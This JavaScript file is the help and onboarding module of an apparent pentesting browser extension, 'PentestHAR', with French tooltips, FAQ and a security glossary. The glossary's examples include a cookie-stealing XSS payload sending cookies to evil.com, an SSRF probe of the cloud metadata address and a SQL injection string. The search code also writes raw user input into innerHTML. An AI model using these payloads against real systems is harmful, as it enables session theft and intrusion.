/**
 * HelpSystem.js - Système d'aide intégré pour PentestHAR
 *
 * Fonctionnalités:
 * - Onboarding tour guidé pour nouveaux utilisateurs
 * - Tooltips contextuels au survol
 * - Drawer d'aide latéral
 * - Toast notifications
 * - Glossaire des termes de sécurité
 * - Raccourcis clavier
 */

class HelpSystem {
  constructor() {
    this.isOnboardingComplete = false;
    this.currentOnboardingStep = 0;
    this.isDrawerOpen = false;
    this.toastQueue = [];
    this.isProcessingToast = false;

    // Configuration
    this.config = {
      onboardingKey: 'pentesthar_onboarding_complete',
      toastDuration: 3000,
      tooltipDelay: 500
    };

    // Données chargées
    this.tooltips = {};
    this.glossary = {};
    this.onboardingSteps = [];
    this.helpContent = {};

    this.init();
  }

  async init() {
    await this.loadData();
    this.checkOnboardingStatus();
    this.initTooltips();
    this.initKeyboardShortcuts();
    this.createHelpDrawer();
    this.createToastContainer();
    this.createOnboardingOverlay();
  }

  /**
   * Charge les données JSON
   */
  async loadData() {
    // Tooltips - textes d'aide au survol
    this.tooltips = {
      // Contrôles header
      'btnToggle': {
        title: 'Démarrer/Arrêter la Capture',
        text: 'Démarre ou arrête la capture du trafic réseau HTTP/HTTPS'
      },
      'btnSaveNow': {
        title: 'Sauvegarder HAR',
        text: 'Sauvegarde immédiatement le fichier HAR avec toutes les requêtes capturées'
      },
      'btnClear': {
        title: 'Effacer',
        text: 'Supprime toutes les données capturées (requêtes, findings, endpoints)'
      },

      // Smart Filters
      'filterStatic': {
        title: 'Ignorer fichiers statiques',
        text: 'Exclut JS, CSS, images, fonts, maps pour réduire le bruit et se concentrer sur les APIs'
      },
      'filterApiOnly': {
        title: 'APIs uniquement',
        text: 'Capture seulement les endpoints /api/, /v1/, /v2/, /graphql, /rest/'
      },
      'filterThirdParty': {
        title: 'Exclure domaines tiers',
        text: 'Ignore les domaines externes (analytics, CDN, tracking) pour focus sur la cible'
      },
      'filterDedupe': {
        title: 'Déduplication',
        text: 'Évite les doublons de requêtes similaires (ignore cache busters, timestamps)'
      },

      // Paramètres
      'autoSave': {
        title: 'Sauvegarde automatique',
        text: 'Sauvegarde automatiquement le HAR quand le buffer atteint le seuil défini'
      },
      'maxSize': {
        title: 'Seuil de sauvegarde',
        text: 'Taille en MB à partir de laquelle le fichier est sauvegardé automatiquement'
      },
      'includeResponses': {
        title: 'Corps des réponses',
        text: 'Inclut le contenu des réponses HTTP (plus de données mais fichiers plus volumineux)'
      },

      // Onglets
      'tab-capture': {
        title: 'Onglet Capture',
        text: 'Statistiques et contrôles de capture du trafic réseau'
      },
      'tab-security': {
        title: 'Onglet Sécurité',
        text: 'Secrets détectés, en-têtes vulnérables, problèmes CORS et cookies'
      },
      'tab-endpoints': {
        title: 'Onglet Endpoints',
        text: 'APIs découvertes, candidats IDOR, paramètres extraits'
      },
      'tab-export': {
        title: 'Onglet Export',
        text: 'Génère des exports pour ffuf, curl, Postman, Nuclei et rapports'
      },
      'tab-ai': {
        title: 'Onglet AI Export',
        text: 'Prompts optimisés pour ChatGPT/Claude, reconstruction OpenAPI'
      },

      // Findings sécurité
      'criticalCount': {
        title: 'Findings Critiques',
        text: 'Secrets exposés, credentials en clair - à corriger immédiatement'
      },
      'highCount': {
        title: 'Findings Élevés',
        text: 'En-têtes de sécurité manquants, CORS mal configuré'
      },
      'mediumCount': {
        title: 'Findings Moyens',
        text: 'Cookies non sécurisés, avertissements de configuration'
      },

      // Endpoints
      'idorTotal': {
        title: 'Candidats IDOR',
        text: 'Endpoints avec IDs séquentiels/prévisibles - tester les accès non autorisés'
      },
      'jsEndpointsTotal': {
        title: 'Endpoints JS',
        text: 'URLs d\'API extraites des fichiers JavaScript'
      }
    };

    // Glossaire des termes de sécurité
    this.glossary = {
      'HAR': {
        term: 'HAR (HTTP Archive)',
        definition: 'Format standard JSON pour enregistrer les échanges HTTP entre navigateur et serveur. Utilisable dans les DevTools et outils de test.',
        link: 'https://www.softwareishard.com/blog/har-12-spec/'
      },
      'IDOR': {
        term: 'IDOR (Insecure Direct Object Reference)',
        definition: 'Vulnérabilité permettant d\'accéder à des ressources d\'autres utilisateurs en modifiant un identifiant (ex: /user/123 → /user/124).',
        example: 'GET /api/orders/1001 → essayer /api/orders/1002'
      },
      'CORS': {
        term: 'CORS (Cross-Origin Resource Sharing)',
        definition: 'Mécanisme de sécurité navigateur contrôlant les requêtes cross-origin. Une mauvaise configuration peut exposer des données.',
        example: 'Access-Control-Allow-Origin: * est dangereux avec credentials'
      },
      'JWT': {
        term: 'JWT (JSON Web Token)',
        definition: 'Jeton d\'authentification en 3 parties (header.payload.signature). Peut contenir des données sensibles dans le payload décodé en base64.',
        example: 'eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature'
      },
      'CSP': {
        term: 'CSP (Content Security Policy)',
        definition: 'En-tête HTTP définissant les sources autorisées pour scripts, styles, images. Protège contre XSS.',
        example: 'Content-Security-Policy: script-src \'self\''
      },
      'HSTS': {
        term: 'HSTS (HTTP Strict Transport Security)',
        definition: 'En-tête forçant le navigateur à utiliser HTTPS. Protège contre les attaques de downgrade.',
        example: 'Strict-Transport-Security: max-age=31536000; includeSubDomains'
      },
      'XSS': {
        term: 'XSS (Cross-Site Scripting)',
        definition: 'Injection de code JavaScript malveillant dans une page web. Permet le vol de cookies, sessions.',
        example: '<script>document.location="evil.com?c="+document.cookie</script>'
      },
      'SSRF': {
        term: 'SSRF (Server-Side Request Forgery)',
        definition: 'Forcer le serveur à faire des requêtes vers des ressources internes ou externes non autorisées.',
        example: '?url=http://169.254.169.254/latest/meta-data/'
      },
      'SQLi': {
        term: 'Injection SQL',
        definition: 'Injection de code SQL dans les paramètres pour manipuler la base de données.',
        example: '\' OR 1=1 --'
      },
      'API Key': {
        term: 'Clé API',
        definition: 'Clé d\'authentification pour accéder à une API. Ne doit jamais être exposée côté client.',
        example: 'X-API-Key: sk_live_abcd1234...'
      },
      'Pentest': {
        term: 'Test d\'intrusion (Pentest)',
        definition: 'Évaluation de la sécurité d\'un système en simulant des attaques. Requiert une autorisation écrite.',
        example: 'Audit de sécurité d\'une application web'
      },
      'Bug Bounty': {
        term: 'Bug Bounty',
        definition: 'Programme de récompenses pour la découverte de vulnérabilités. Plateformes: HackerOne, Bugcrowd.',
        example: 'Signaler une faille XSS sur program.bugcrowd.com'
      }
    };

    // Étapes de l'onboarding
    this.onboardingSteps = [
      {
        target: null,
        title: 'Bienvenue dans PentestHAR !',
        content: 'Extension Firefox pour l\'analyse de sécurité du trafic HTTP. Parfait pour le pentest, bug bounty et security research.',
        position: 'center'
      },
      {
        target: '#btnToggle',
        title: 'Démarrer la capture',
        content: 'Cliquez sur Start pour commencer à capturer le trafic réseau. Naviguez ensuite sur le site cible.',
        position: 'bottom'
      },
      {
        target: '.smart-filters',
        title: 'Filtres intelligents',
        content: 'Réduisez le bruit en filtrant les fichiers statiques et domaines tiers. Concentrez-vous sur les APIs.',
        position: 'bottom'
      },
      {
        target: '[data-tab="security"]',
        title: 'Analyse de sécurité',
        content: 'Détection automatique des secrets exposés, en-têtes vulnérables, problèmes CORS et cookies non sécurisés.',
        position: 'bottom'
      },
      {
        target: '[data-tab="endpoints"]',
        title: 'Découverte d\'endpoints',
        content: 'Liste des APIs découvertes avec détection des candidats IDOR (IDs séquentiels à tester).',
        position: 'bottom'
      },
      {
        target: '[data-tab="export"]',
        title: 'Exports multi-formats',
        content: 'Générez des exports pour ffuf, curl, Postman, Nuclei et des rapports Markdown.',
        position: 'bottom'
      },
      {
        target: '[data-tab="ai"]',
        title: 'Intégration IA',
        content: 'Prompts optimisés pour ChatGPT/Claude et reconstruction automatique de specs OpenAPI.',
        position: 'bottom'
      },
      {
        target: null,
        title: 'Prêt à commencer !',
        content: 'Cliquez sur le bouton ? à tout moment pour accéder à l\'aide. Bon pentest !',
        position: 'center'
      }
    ];

    // Contenu d'aide par section
    this.helpContent = {
      quickStart: {
        title: 'Guide Rapide',
        content: `
## Démarrage rapide

1. **Ouvrir les DevTools** (F12) sur le site cible
2. **Aller à l'onglet PentestHAR**
3. **Cliquer sur Start** pour démarrer la capture
4. **Naviguer sur le site** - les requêtes sont capturées automatiquement
5. **Consulter l'onglet Sécurité** pour voir les findings
6. **Exporter** dans le format souhaité (ffuf, Burp, Postman...)

## Conseils

- Activez "API only" pour focus sur les endpoints intéressants
- Utilisez "Exclude 3rd party" pour ignorer analytics et CDN
- L'onglet AI Export génère des prompts pour ChatGPT/Claude
        `
      },
      workflows: {
        title: 'Cas d\'utilisation',
        content: `
## Je teste une API REST

1. Activez le filtre "API only"
2. Capturez les requêtes pendant que vous utilisez l'application
3. Consultez les endpoints découverts
4. Exportez en format Postman pour tests manuels
5. Utilisez l'export Nuclei pour tester les IDOR

## Je cherche des secrets exposés

1. Désactivez "Ignore static" pour scanner aussi les JS
2. Naviguez sur toute l'application
3. Consultez l'onglet Sécurité > Secrets
4. Les JWT sont automatiquement décodés

## Je prépare un rapport de pentest

1. Capturez tout le trafic de l'application
2. Consultez tous les findings de l'onglet Sécurité
3. Exportez en Markdown Report
4. Utilisez AI Export > Bug Bounty Template pour un rapport structuré
        `
      },
      shortcuts: {
        title: 'Raccourcis clavier',
        content: `
| Raccourci | Action |
|-----------|--------|
| \`Ctrl+S\` | Sauvegarder HAR |
| \`Ctrl+R\` | Start/Stop capture |
| \`Ctrl+E\` | Ouvrir exports |
| \`?\` ou \`F1\` | Afficher aide |
| \`1-5\` | Naviguer entre onglets |
| \`Escape\` | Fermer modals/drawer |
        `
      },
      faq: {
        title: 'Questions Fréquentes',
        content: `
## Pourquoi dois-je ouvrir les DevTools ?

Firefox limite l'accès aux requêtes réseau aux extensions DevTools. C'est une mesure de sécurité.

## Les données sont-elles envoyées quelque part ?

Non, tout reste local dans votre navigateur. Aucune donnée n'est transmise.

## Comment tester les candidats IDOR ?

1. Notez l'ID dans l'URL (ex: /users/123)
2. Essayez d'autres IDs (122, 124, 1, 999...)
3. Comparez les réponses (200 = potentielle vulnérabilité)

## Le fichier HAR est trop gros

- Réduisez le seuil de sauvegarde auto
- Désactivez "Response bodies" si non nécessaire
- Utilisez les filtres pour limiter la capture

## Puis-je utiliser cette extension légalement ?

Oui, uniquement sur des systèmes pour lesquels vous avez une autorisation écrite (pentest, bug bounty avec scope défini, vos propres applications).
        `
      }
    };
  }

  /**
   * Vérifie si l'onboarding a déjà été complété
   */
  checkOnboardingStatus() {
    try {
      this.isOnboardingComplete = localStorage.getItem(this.config.onboardingKey) === 'true';
    } catch (e) {
      this.isOnboardingComplete = false;
    }
  }

  /**
   * Initialise les tooltips sur les éléments
   */
  initTooltips() {
    // Ajoute les tooltips après le chargement du DOM
    setTimeout(() => {
      for (const [id, tooltip] of Object.entries(this.tooltips)) {
        const element = document.getElementById(id) || document.querySelector(`[data-tab="${id.replace('tab-', '')}"]`);
        if (element) {
          element.classList.add('has-tooltip');
          element.setAttribute('data-tooltip-title', tooltip.title);
          element.setAttribute('data-tooltip-text', tooltip.text);

          // Event listeners pour afficher le tooltip
          element.addEventListener('mouseenter', (e) => this.showTooltip(e, tooltip));
          element.addEventListener('mouseleave', () => this.hideTooltip());
        }
      }
    }, 100);
  }

  /**
   * Affiche un tooltip
   */
  showTooltip(event, tooltip) {
    this.hideTooltip(); // Supprime l'ancien tooltip

    const tooltipEl = document.createElement('div');
    tooltipEl.className = 'help-tooltip';
    tooltipEl.innerHTML = `
      <div class="help-tooltip-title">${tooltip.title}</div>
      <div class="help-tooltip-text">${tooltip.text}</div>
    `;

    document.body.appendChild(tooltipEl);

    // Positionnement
    const rect = event.target.getBoundingClientRect();
    const tooltipRect = tooltipEl.getBoundingClientRect();

    let top = rect.bottom + 8;
    let left = rect.left + (rect.width / 2) - (tooltipRect.width / 2);

    // Ajustements si hors écran
    if (left < 10) left = 10;
    if (left + tooltipRect.width > window.innerWidth - 10) {
      left = window.innerWidth - tooltipRect.width - 10;
    }
    if (top + tooltipRect.height > window.innerHeight - 10) {
      top = rect.top - tooltipRect.height - 8;
    }

    tooltipEl.style.top = `${top}px`;
    tooltipEl.style.left = `${left}px`;
    tooltipEl.classList.add('visible');
  }

  /**
   * Cache le tooltip
   */
  hideTooltip() {
    const existing = document.querySelector('.help-tooltip');
    if (existing) {
      existing.remove();
    }
  }

  /**
   * Initialise les raccourcis clavier
   */
  initKeyboardShortcuts() {
    document.addEventListener('keydown', (e) => {
      // Ignore si dans un champ de saisie
      if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
        return;
      }

      // ? ou F1 = Aide
      if (e.key === '?' || e.key === 'F1') {
        e.preventDefault();
        this.toggleDrawer();
      }

      // Escape = Fermer
      if (e.key === 'Escape') {
        this.closeDrawer();
        this.closeOnboarding();
      }

      // Ctrl+S = Sauvegarder
      if (e.ctrlKey && e.key === 's') {
        e.preventDefault();
        document.getElementById('btnSaveNow')?.click();
      }

      // Ctrl+R = Toggle capture
      if (e.ctrlKey && e.key === 'r') {
        e.preventDefault();
        document.getElementById('btnToggle')?.click();
      }

      // Ctrl+E = Export tab
      if (e.ctrlKey && e.key === 'e') {
        e.preventDefault();
        document.querySelector('[data-tab="export"]')?.click();
      }

      // 1-5 = Navigation onglets
      if (['1', '2', '3', '4', '5'].includes(e.key) && !e.ctrlKey && !e.altKey) {
        const tabs = document.querySelectorAll('.tab-btn');
        const index = parseInt(e.key) - 1;
        if (tabs[index]) {
          tabs[index].click();
        }
      }
    });
  }

  /**
   * Crée le drawer d'aide
   */
  createHelpDrawer() {
    const drawer = document.createElement('div');
    drawer.id = 'helpDrawer';
    drawer.className = 'help-drawer';
    drawer.innerHTML = `
      <div class="help-drawer-header">
        <h2>Aide PentestHAR</h2>
        <button class="help-drawer-close" onclick="helpSystem.closeDrawer()">×</button>
      </div>

      <div class="help-drawer-search">
        <input type="text" id="helpSearch" placeholder="Rechercher dans l'aide...">
      </div>

      <div class="help-drawer-nav">
        <button class="help-nav-btn active" data-section="quickStart">Guide Rapide</button>
        <button class="help-nav-btn" data-section="glossary">Glossaire</button>
        <button class="help-nav-btn" data-section="workflows">Cas d'utilisation</button>
        <button class="help-nav-btn" data-section="shortcuts">Raccourcis</button>
        <button class="help-nav-btn" data-section="faq">FAQ</button>
      </div>

      <div class="help-drawer-content" id="helpDrawerContent">
        <!-- Contenu dynamique -->
      </div>

      <div class="help-drawer-footer">
        <button class="btn-secondary" onclick="helpSystem.startOnboarding()">
          Relancer le tour guidé
        </button>
        <div class="help-version">PentestHAR v2.1.0</div>
      </div>
    `;

    document.body.appendChild(drawer);

    // Navigation
    drawer.querySelectorAll('.help-nav-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        drawer.querySelectorAll('.help-nav-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        this.showHelpSection(btn.dataset.section);
      });
    });

    // Recherche
    const searchInput = drawer.querySelector('#helpSearch');
    searchInput.addEventListener('input', (e) => this.searchHelp(e.target.value));

    // Afficher la première section
    this.showHelpSection('quickStart');
  }

  /**
   * Affiche une section d'aide
   */
  showHelpSection(section) {
    const content = document.getElementById('helpDrawerContent');

    if (section === 'glossary') {
      content.innerHTML = this.renderGlossary();
    } else if (this.helpContent[section]) {
      content.innerHTML = `
        <div class="help-section">
          <h3>${this.helpContent[section].title}</h3>
          <div class="help-markdown">${this.renderMarkdown(this.helpContent[section].content)}</div>
        </div>
      `;
    }
  }

  /**
   * Rend le glossaire
   */
  renderGlossary() {
    let html = '<div class="help-glossary">';

    for (const [key, item] of Object.entries(this.glossary)) {
      html += `
        <div class="glossary-item">
          <div class="glossary-term">${item.term}</div>
          <div class="glossary-definition">${item.definition}</div>
          ${item.example ? `<div class="glossary-example"><code>${item.example}</code></div>` : ''}
        </div>
      `;
    }

    html += '</div>';
    return html;
  }

  /**
   * Rendu basique du markdown
   */
  renderMarkdown(text) {
    return text
      .replace(/^## (.*$)/gm, '<h4>$1</h4>')
      .replace(/^### (.*$)/gm, '<h5>$1</h5>')
      .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
      .replace(/\*(.*?)\*/g, '<em>$1</em>')
      .replace(/`([^`]+)`/g, '<code>$1</code>')
      .replace(/^\d+\. (.*$)/gm, '<li>$1</li>')
      .replace(/^- (.*$)/gm, '<li>$1</li>')
      .replace(/\n\n/g, '</p><p>')
      .replace(/\|([^|]+)\|([^|]+)\|/g, '<tr><td>$1</td><td>$2</td></tr>');
  }

  /**
   * Recherche dans l'aide
   */
  searchHelp(query) {
    if (!query || query.length < 2) {
      this.showHelpSection('quickStart');
      return;
    }

    const results = [];
    const queryLower = query.toLowerCase();

    // Recherche dans le glossaire
    for (const [key, item] of Object.entries(this.glossary)) {
      if (item.term.toLowerCase().includes(queryLower) ||
          item.definition.toLowerCase().includes(queryLower)) {
        results.push({
          type: 'glossaire',
          title: item.term,
          content: item.definition
        });
      }
    }

    // Recherche dans le contenu d'aide
    for (const [key, section] of Object.entries(this.helpContent)) {
      if (section.content.toLowerCase().includes(queryLower)) {
        results.push({
          type: 'aide',
          title: section.title,
          content: section.content.substring(0, 150) + '...'
        });
      }
    }

    // Affiche les résultats
    const content = document.getElementById('helpDrawerContent');
    if (results.length === 0) {
      content.innerHTML = '<div class="help-no-results">Aucun résultat pour "' + query + '"</div>';
    } else {
      content.innerHTML = `
        <div class="help-search-results">
          <h4>${results.length} résultat(s) pour "${query}"</h4>
          ${results.map(r => `
            <div class="help-search-result">
              <span class="result-type">${r.type}</span>
              <strong>${r.title}</strong>
              <p>${r.content}</p>
            </div>
          `).join('')}
        </div>
      `;
    }
  }

  /**
   * Toggle le drawer
   */
  toggleDrawer() {
    if (this.isDrawerOpen) {
      this.closeDrawer();
    } else {
      this.openDrawer();
    }
  }

  /**
   * Ouvre le drawer
   */
  openDrawer() {
    const drawer = document.getElementById('helpDrawer');
    if (drawer) {
      drawer.classList.add('open');
      this.isDrawerOpen = true;
      // Focus sur la recherche
      setTimeout(() => {
        document.getElementById('helpSearch')?.focus();
      }, 300);
    }
  }

  /**
   * Ferme le drawer
   */
  closeDrawer() {
    const drawer = document.getElementById('helpDrawer');
    if (drawer) {
      drawer.classList.remove('open');
      this.isDrawerOpen = false;
    }
  }

  /**
   * Crée le container pour les toasts
   */
  createToastContainer() {
    const container = document.createElement('div');
    container.id = 'toastContainer';
    container.className = 'toast-container';
    document.body.appendChild(container);
  }

  /**
   * Affiche une notification toast
   */
  showToast(message, type = 'info', duration = null) {
    const toast = {
      message,
      type,
      duration: duration || this.config.toastDuration
    };

    this.toastQueue.push(toast);

    if (!this.isProcessingToast) {
      this.processToastQueue();
    }
  }

  /**
   * Traite la file de toasts
   */
  processToastQueue() {
    if (this.toastQueue.length === 0) {
      this.isProcessingToast = false;
      return;
    }

    this.isProcessingToast = true;
    const toast = this.toastQueue.shift();

    const container = document.getElementById('toastContainer');
    const toastEl = document.createElement('div');
    toastEl.className = `toast toast-${toast.type}`;

    const icons = {
      success: '✓',
      error: '✗',
      warning: '⚠',
      info: 'ℹ'
    };

    toastEl.innerHTML = `
      <span class="toast-icon">${icons[toast.type] || icons.info}</span>
      <span class="toast-message">${toast.message}</span>
    `;

    container.appendChild(toastEl);

    // Animation d'entrée
    setTimeout(() => toastEl.classList.add('visible'), 10);

    // Suppression après durée
    setTimeout(() => {
      toastEl.classList.remove('visible');
      setTimeout(() => {
        toastEl.remove();
        this.processToastQueue();
      }, 300);
    }, toast.duration);
  }

  /**
   * Crée l'overlay d'onboarding
   */
  createOnboardingOverlay() {
    const overlay = document.createElement('div');
    overlay.id = 'onboardingOverlay';
    overlay.className = 'onboarding-overlay';
    overlay.style.display = 'none';
    overlay.innerHTML = `
      <div class="onboarding-spotlight" id="onboardingSpotlight"></div>
      <div class="onboarding-tooltip" id="onboardingTooltip">
        <div class="onboarding-title"></div>
        <div class="onboarding-content"></div>
        <div class="onboarding-footer">
          <div class="onboarding-progress"></div>
          <div class="onboarding-actions">
            <button class="btn-secondary" id="onboardingSkip">Passer</button>
            <button class="btn-primary" id="onboardingNext">Suivant</button>
          </div>
        </div>
      </div>
    `;

    document.body.appendChild(overlay);

    // Event listeners
    document.getElementById('onboardingSkip').addEventListener('click', () => this.closeOnboarding());
    document.getElementById('onboardingNext').addEventListener('click', () => this.nextOnboardingStep());
  }

  /**
   * Démarre le tour d'onboarding
   */
  startOnboarding() {
    this.currentOnboardingStep = 0;
    this.closeDrawer();
    this.showOnboardingStep();
  }

  /**
   * Affiche une étape de l'onboarding
   */
  showOnboardingStep() {
    const step = this.onboardingSteps[this.currentOnboardingStep];
    if (!step) {
      this.completeOnboarding();
      return;
    }

    const overlay = document.getElementById('onboardingOverlay');
    const spotlight = document.getElementById('onboardingSpotlight');
    const tooltip = document.getElementById('onboardingTooltip');

    overlay.style.display = 'block';

    // Mise à jour du contenu
    tooltip.querySelector('.onboarding-title').textContent = step.title;
    tooltip.querySelector('.onboarding-content').textContent = step.content;
    tooltip.querySelector('.onboarding-progress').textContent =
      `${this.currentOnboardingStep + 1} / ${this.onboardingSteps.length}`;

    // Bouton "Terminer" à la dernière étape
    const nextBtn = document.getElementById('onboardingNext');
    nextBtn.textContent = this.currentOnboardingStep === this.onboardingSteps.length - 1 ? 'Terminer' : 'Suivant';

    // Positionnement
    if (step.target) {
      const target = document.querySelector(step.target);
      if (target) {
        const rect = target.getBoundingClientRect();

        // Spotlight
        spotlight.style.display = 'block';
        spotlight.style.top = `${rect.top - 4}px`;
        spotlight.style.left = `${rect.left - 4}px`;
        spotlight.style.width = `${rect.width + 8}px`;
        spotlight.style.height = `${rect.height + 8}px`;

        // Tooltip position
        let tooltipTop = rect.bottom + 16;
        let tooltipLeft = rect.left;

        if (step.position === 'top') {
          tooltipTop = rect.top - tooltip.offsetHeight - 16;
        }

        // Ajustements
        if (tooltipLeft + 300 > window.innerWidth) {
          tooltipLeft = window.innerWidth - 320;
        }
        if (tooltipTop + 200 > window.innerHeight) {
          tooltipTop = window.innerHeight - 220;
        }

        tooltip.style.top = `${tooltipTop}px`;
        tooltip.style.left = `${tooltipLeft}px`;
        tooltip.style.transform = 'none';
      }
    } else {
      // Centre de l'écran
      spotlight.style.display = 'none';
      tooltip.style.top = '50%';
      tooltip.style.left = '50%';
      tooltip.style.transform = 'translate(-50%, -50%)';
    }
  }

  /**
   * Passe à l'étape suivante
   */
  nextOnboardingStep() {
    this.currentOnboardingStep++;
    if (this.currentOnboardingStep >= this.onboardingSteps.length) {
      this.completeOnboarding();
    } else {
      this.showOnboardingStep();
    }
  }

  /**
   * Termine l'onboarding
   */
  completeOnboarding() {
    this.closeOnboarding();
    try {
      localStorage.setItem(this.config.onboardingKey, 'true');
    } catch (e) {}
    this.isOnboardingComplete = true;
    this.showToast('Tour terminé ! Cliquez sur ? pour l\'aide.', 'success');
  }

  /**
   * Ferme l'onboarding
   */
  closeOnboarding() {
    const overlay = document.getElementById('onboardingOverlay');
    if (overlay) {
      overlay.style.display = 'none';
    }
  }

  /**
   * Vérifie si l'onboarding doit être lancé
   */
  shouldShowOnboarding() {
    return !this.isOnboardingComplete;
  }

  /**
   * Affiche une définition du glossaire
   */
  showGlossaryTerm(term) {
    const item = this.glossary[term];
    if (item) {
      this.openDrawer();
      document.querySelector('.help-nav-btn[data-section="glossary"]')?.click();
    }
  }
}

// Instance globale
let helpSystem;

// Initialisation au chargement
if (typeof window !== 'undefined') {
  window.addEventListener('DOMContentLoaded', () => {
    helpSystem = new HelpSystem();

    // Lance l'onboarding si premier lancement
    setTimeout(() => {
      if (helpSystem.shouldShowOnboarding()) {
        helpSystem.startOnboarding();
      }
    }, 500);
  });
}

// Export pour Node.js (tests)
if (typeof module !== 'undefined' && module.exports) {
  module.exports = HelpSystem;
}
